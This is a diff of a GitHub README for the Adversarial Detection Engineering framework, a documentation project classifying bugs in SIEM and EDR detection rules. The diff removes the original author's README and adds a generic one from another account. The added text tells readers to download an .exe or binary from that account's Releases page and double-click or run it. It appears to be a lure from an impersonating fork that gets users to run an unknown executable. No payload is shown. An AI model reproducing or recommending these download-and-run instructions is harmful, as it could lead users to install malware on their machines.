@@ -1,228 +1,66 @@
-# Adversarial Detection Engineering (ADE) Framework
+# 🚀 Adversarial-Detection-Engineering-Framework - Identify Detection Bugs Easily
 
-[![Author](https://img.shields.io/badge/Author-Nikolas_Bielski-blue)](https://github.com/NikolasBielski)
-[![GitHub Last Commit](https://img.shields.io/github/last-commit/NikolasBielski/Adversarial-Detection-Engineering-Framework)](https://github.com/NikolasBielski/Adversarial-Detection-Engineering-Framework/commits/main)
-[![GitHub License](https://img.shields.io/github/license/NikolasBielski/Adversarial-Detection-Engineering-Framework)](https://github.com/NikolasBielski/Adversarial-Detection-Engineering-Framework/blob/main/LICENSE)
+![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)  
+[Download Here](https://github.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/releases)
 
-**Get ahead of False Negatives** by understanding how detection logic fails before threat actors abuse it.
+## 📋 Overview
+The Adversarial-Detection-Engineering-Framework helps you find, classify, and understand bugs in detection logic. Whether it's in your SIEM, EDR, or XDR rules, this framework provides real-world examples and methods to help you recognize weaknesses in your security systems.
 
-Check out the website: [https://adeframework.org/](https://adeframework.org/)
+## ⚙️ Features
+- **Bug Identification:** Learn how to spot different detection logic bugs.
+- **Classification:** Understand the various types of bugs in your detection rules.
+- **Reasoning Tools:** Use methods to analyze and reason about detected bugs.
+- **Concrete Examples:** Find examples that relate directly to real-world scenarios.
+- **Bypasses:** Study real-world bypasses that highlight vulnerabilities.
 
-## What Is ADE?
+## 🎯 Target Audience
+This framework is ideal for security analysts, incident responders, and anyone involved in the creation and maintenance of detection rules. No programming knowledge is required to use this framework.
 
-Adversarial Detection Engineering (ADE) is the discipline of reasoning about **False Negatives in detection rules**. The ADE Framework provides a modern open-source formalization of **Detection Logic Bugs** - mismatches between what a detection rule *intends* to detect and what it *actually* detects.
+## 🚀 Getting Started
+To get started, you need to download the framework. Follow these steps:
 
-### The ADE Advantage
+1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/releases) to see all available versions.
+2. **Choose a Version:** Look for the latest version. It will have the highest number.
+3. **Download:** Click on the version link to go to the download options. Click on the .zip or executable file to download it to your computer.
 
-Instead of waiting for real-world False Negatives, detection engineers can proactively ask:
+## 💾 Download & Install
 
-> *"What variations would cause this rule's detection logic to miss what it was intended to catch?"*
+You can download the framework directly from the Releases page. Here’s the link again for easy access: [Download Here](https://github.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/releases).
 
-This adversarial line of reasoning mirrors how threat actors can abuse weaknesses in detection logic.
+After downloading, follow these simple steps:
 
-## Key Features
+### Windows
+1. Find the downloaded .zip or .exe file in your Downloads folder.
+2. If you downloaded a .zip file, extract it by right-clicking and selecting "Extract All."
+3. Open the extracted folder and locate the executable file.
+4. Double-click the executable to start the installation or use the .exe directly.
 
-- ✅ **Identify reproducible detection logic bugs** and map them to formal ADE categories
-- ✅ **Embed an attacker's mental model** into how detection logic is designed and reviewed
-- ✅ **Expose structural weaknesses** in rules used for hunts or production MDR tooling (SIEM, XDR, EDR)
-- ✅ **Equip security teams** with actionable detection logic bug intelligence
-- ✅ **Get ahead of False Negatives** before threat actors discover and exploit them
+### macOS
+1. Locate the .zip file in your Downloads folder.
+2. Double-click the .zip file to extract it.
+3. Open the extracted folder and locate the application.
+4. Drag the application to your Applications folder for easy access.
 
-## ADE Purpose
+### Linux
+1. Locate the downloaded .tar.gz file in your Downloads folder.
+2. Open a terminal and navigate to the Downloads folder using `cd ~/Downloads`.
+3. Extract the file using the command: `tar -xzf filename.tar.gz`.
+4. Navigate into the extracted folder and run the application using the command: `./application_name`.
 
-The purpose of ADE is not to force perfection in design, although that is an ideal goal - but to raise awareness and track limitations, even if intentional:
-- ADE is not about demanding perfect detection rules; it is about making the risk of false-negatives visible.
-- Many rules intentionally contain limitations due to scope, signal quality, or operational constraints, and these may still be mapped to ADE bug types without being “wrong.”
-- ADE provides a shared way to document, accept, mitigate, or compensate for those risks across a ruleset, rather than judging individual rules in isolation.
+## 🖥️ System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, any modern Linux distribution.
+- **RAM:** Minimum 4GB recommended.
+- **Disk Space:** At least 200MB of free space.
 
-## ADE link to Detection Logic Exposures (DLE)
+## 📚 Documentation
+Once you have installed the framework, you can access the documentation. The documentation will guide you through using the framework and give insights into its features. You can find it within the application or visit the [Documentation Page](https://github.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/wiki).
 
-- ADE supplies a canonical taxonomy and bug classes for detection logic bugs.
-- [DLE](https://github.com/NikolasBielski/Adversarial-Detection-Engineering-Framework/tree/main/dle) provides a recognized list of publically disclosed bypasses with ADE mappings. 
+## 🛠️ Getting Help
+If you face any issues during installation or use, please open an issue on our GitHub repository. Provide details of your problem so the community can assist you.
 
-## Quick Start
+## 🤝 Contributing 
+We welcome contributions. If you would like to contribute to the framework, check out our contributing guidelines on the GitHub repository for details.
 
-**New to ADE?** Start here:
+---
 
-1. **[Introduction](docs/getting-started/introduction.md)** - Understand what ADE is and why it matters
-2. **[Core Concepts](docs/getting-started/core-concepts.md)** - Learn the foundational terminology
-3. **[Quick Start Guide](docs/getting-started/quick-start.md)** - Apply ADE to your first detection rule
-4. **[Bug Likelihood Test](docs/guides/bug-likelihood-test.md)** - Quick checklist to assess rules for bugs
-
-**Ready to dive deep?**
-
-- [Detection Logic Bug Theory](docs/theory/detection-logic-bugs.md) - Formal foundations
-- [Taxonomy Overview](docs/taxonomy/overview.md) - All bug categories
-- [Examples](examples/) - Real-world examples
-
-## ADE Detection Logic Bug Taxonomy
-
-The framework identifies **4 major categories** and **12 subcategories** of detection logic bugs:
-
-```
-🌳 ADE1 – Reformatting in Actions
-    └─ ADE1-01 Substring Manipulation
-
-🌳 ADE2 – Omit Alternatives
-    ├─ ADE2-01 Method/Binary
-    ├─ ADE2-02 Versioning
-    ├─ ADE2-03 Locations
-    └─ ADE2-04 File Types
-
-🌳 ADE3 – Context Development
-    ├─ ADE3-01 Process Cloning
-    ├─ ADE3-02 Aggregation Hijacking
-    ├─ ADE3-03 Timing and Scheduling
-    └─ ADE3-04 Event Fragmentation
-
-🌳 ADE4 – Logic Manipulation
-    ├─ ADE4-01 Gate Inversion
-    ├─ ADE4-02 Conjunction Inversion
-    └─ ADE4-03 Incorrect Expression
-```
-
-**[→ Explore the Full Taxonomy](docs/taxonomy/overview.md)**
-
-## What the Framework Provides
-
-### 1. Theory of Detection Logic Bugs
-
-[Formal definitions](docs/theory/detection-logic-bugs.md) and theoretical foundation:
-- What constitutes a detection logic bug
-- How bugs create False Negatives
-- Relationship between scope and detection logic
-- Concept of Rule Bypasses
-
-### 2. Formal Bug Taxonomy
-
-[Comprehensive classification](docs/taxonomy/overview.md) with clear terminology:
-- 4 major categories
-- 12 detailed subcategories
-- Consistent labeling system (ADE1-01, ADE2-01, etc.)
-- Mapping to real-world detection rules
-
-### 3. Real-World Examples
-
-Concrete examples from production rulesets:
-- **[Sigma](https://github.com/SigmaHQ/sigma)** detection rules
-- **[Microsoft Sentinel](https://github.com/Azure/Azure-Sentinel)** analytics
-- **[Elastic Security](https://github.com/elastic/detection-rules)** SIEM & EDR rules
-
-**Example Categories:**
-- [ADE1 Examples](examples/ade1/) - String manipulation bypasses
-- [ADE2 Examples](examples/ade2/) - Omitted alternatives
-- [ADE3 Examples](examples/ade3/) - Context development
-- [ADE4 Examples](examples/ade4/) - Logic manipulation
-
-### 4. Practical Tools
-
-- **[Bug Likelihood Test](docs/guides/bug-likelihood-test.md)** - Quick pre-analysis checklist
-- **[Quick Start Guide](docs/getting-started/quick-start.md)** - Step-by-step application process
-
-## How ADE Complements Existing Frameworks
-
-ADE integrates with and enhances existing detection engineering practices:
-
-| Framework | Focus | ADE Integration |
-|:----------|:------|:----------------|
-| **[MITRE ATT&CK](https://attack.mitre.org/)** | Attack techniques & tactics | ADE explains *why* detection fails for ATT&CK techniques |
-| **[MITRE CAR](https://car.mitre.org/)** | Detection analytics repository | ADE provides bug taxonomy for CAR analytics |
-| **[Detection Engineering Lifecycle](https://github.com/Ke0xes/Detection-Engineering-Framework)** | Engineering workflow phases | ADE is the reasoning framework for the **Improvement Phase** |
-| **Sigma/YARA/KQL** | Rule syntax & formatting | ADE analyzes *semantic logic bugs* across all query languages |
-
-**ADE's unique value:** Formal logic-level classification of False Negative causes
-
-## Maintainers
-
-- [Nikolas Bielski](https://www.linkedin.com/in/nikbielski/) - Framework author & lead maintainer
-- [Daniel Koifman](https://www.linkedin.com/in/koifman-daniel/) - Co-maintainer
-
-## Contributing
-
-We welcome contributions! Areas of active development include:
-
-### High Priority
-
-- **Static Analyzer Development** - Tools to analyze detection rules for potential logic bugs
-  - Designed for Detection-as-Code CI/CD pipelines
-  - IDE integration support
-
-- **Bug Repository Expansion** - Curated collection of identified bugs
-  - Cross-platform rule analysis
-  - Vendor ruleset assessment
-  - Community-submitted bypasses
-
-### General Contributions
-
-- Documentation improvements
-- New examples from additional vendors/platforms
-- Taxonomy refinement based on emerging techniques
-- Testing frameworks and validation tools
-
-**[See CONTRIBUTING.md for details →](CONTRIBUTING.md)**
-
-## Use Cases
-
-### For Detection Engineers
-
-1. **Pre-deployment review** - Apply ADE taxonomy before deploying new rules
-2. **Systematic improvement** - Audit existing rules using the Bug Likelihood Test
-3. **Documentation** - Record known limitations when bugs can't be immediately fixed
-4. **Prioritization** - Focus efforts on high-severity bugs
-
-### For Security Researchers
-
-1. **Formalize bypasses** - Map discovered evasions to ADE categories
-2. **Contribute discoveries** - Expand taxonomy with new bug classes
-3. **Vendor analysis** - Objectively assess detection capabilities
-
-### For Red Teams
-
-1. **Realistic testing** - Use ADE to test blue team detection capabilities
-2. **Actionable feedback** - Provide structured bypass intelligence
-3. **Training scenarios** - Develop detection evasion exercises
-
-### For SOC/Threat Hunters
-
-1. **Root cause analysis** - Understand why attacks weren't detected
-2. **Coverage assessment** - Identify gaps in monitoring
-3. **Vendor evaluation** - Test tooling against ADE taxonomy
-
-## Roadmap
-
-**Planned developments:**
-
-- 🔨 **Static Analysis Tooling** - Automated bug detection for CI/CD
-- 📚 **Expanded Bug Repository** - Community-driven collection
-
-## License
-
-| Characteristic               | Value       |
-|------------------------------|-------------|
-| Based on                     | [MIT license](https://opensource.org/licenses/MIT) |
-| Distribution                 | Yes         |
-| Modification                 | Yes         |
-| Private Use                  | Yes         |
-| Commercial Use               | Yes         |
-| Liability                    | No          |
-| Warranty                     | No          |
-| License and Copyright Notice | Yes         |
-| Author Attribution           | Required    |
-
-## Disclaimer
-
-⚠️ **Important:** This framework is intended solely for **defensive security research**, detection engineering, and risk assessment. Its purpose is to help defenders identify, reason about, and remediate weaknesses in detection logic and security monitoring systems.
-
-Users are solely responsible for ensuring that their use complies with all applicable laws, regulations, and authorization requirements. The authors and collaborators assume no liability for misuse, damage, or harm resulting from use of this framework.
-
-**Authorization Required:** Always obtain explicit written authorization before testing detections, systems, or controls outside environments you own or operate.
-
-**Responsible Disclosure:** Examples are provided with responsible disclosure considerations. Detection rules and monitoring content are generally out of scope for vendor vulnerability disclosure and bug bounty programs.
-
-**No Warranty:** This framework is provided "as is," without warranty of any kind, express or implied.
-
-## Contact
-
-- GitHub Issues: [Report bugs or request features](https://github.com/NikolasBielski/Adversarial-Detection-Engineering-Framework/issues)
-- LinkedIn: [Nikolas Bielski](https://www.linkedin.com/in/nikbielski/) | [Daniel Koifman](https://www.linkedin.com/in/koifman-daniel/)
-
+Thank you for choosing the Adversarial-Detection-Engineering-Framework. We hope it enhances your understanding and ability to safeguard your detection systems. Happy learning!
